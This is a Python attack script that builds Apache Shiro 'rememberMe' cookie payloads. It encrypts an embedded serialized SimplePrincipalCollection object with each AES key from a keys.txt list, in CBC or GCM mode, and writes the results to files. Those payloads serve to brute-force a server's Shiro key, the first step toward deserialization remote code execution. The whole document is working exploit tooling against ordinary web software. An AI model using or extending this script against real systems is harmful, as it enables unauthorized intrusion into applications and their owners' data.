# coding: utf-8

import os
import argparse
import base64
import uuid
import json
from Crypto.Cipher import AES

class GetKey(object):
    def __init__(self):
        self.checkdata = "rO0ABXNyADJvcmcuYXBhY2hlLnNoaXJvLnN1YmplY3QuU2ltcGxlUHJpbmNpcGFsQ29sbGVjdGlvbqh/WCXGowhKAwABTAAPcmVhbG1QcmluY2lwYWxzdAAPTGphdmEvdXRpbC9NYXA7eHBwdwEAeA=="


    def getKey(self, ciphertype):
        keys = []
        payloads = []
        key_payload = {}

        with open('./keys.txt', "r", encoding='utf8') as f:
            for line in f:
                keys.append(line.strip())

        try:
            for key in keys:
                # print("[-] start key: {0}".format(key))
                if ciphertype == 'CBC':
                    payload = self.CBCCipher(key, base64.b64decode(self.checkdata))
                if ciphertype == 'GCM':
                    payload = self.GCMCipher(key, base64.b64decode(self.checkdata))

                payload = payload.decode()
                payloads.append(payload)
                key_payload[key] = payload
            with open('./payload.txt', "w", encoding='utf-8') as f:
                for i in payloads:
                    f.write(i+'\n')
            with open('./key_payload.json', "w", encoding='utf-8') as json_file:
                json.dump(key_payload, json_file, ensure_ascii = False, indent = 6)

        except Exception as e:
            print(e)
            pass
        return False


    # 1.4.2及以上版本使用GCM加密
    def GCMCipher(self, key, file_body):
        iv = os.urandom(16)
        cipher = AES.new(base64.b64decode(key), AES.MODE_GCM, iv)
        ciphertext, tag = cipher.encrypt_and_digest(file_body)
        ciphertext = ciphertext + tag
        base64_ciphertext = base64.b64encode(iv + ciphertext)
        return base64_ciphertext


    def CBCCipher(self, key, file_body):
        BS = AES.block_size
        pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
        mode = AES.MODE_CBC
        iv = uuid.uuid4().bytes
        file_body = pad(file_body)
        encryptor = AES.new(base64.b64decode(key), mode, iv)
        base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
        return base64_ciphertext


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    # parser.error = parser_error
    parser._optionals.title = "OPTIONS"
    parser.add_argument('-T', '--ciphertype', help='CipherType, GCM or CBC', required=True)
    args = parser.parse_args()

    Main = GetKey()
    Main.getKey(args.ciphertype)

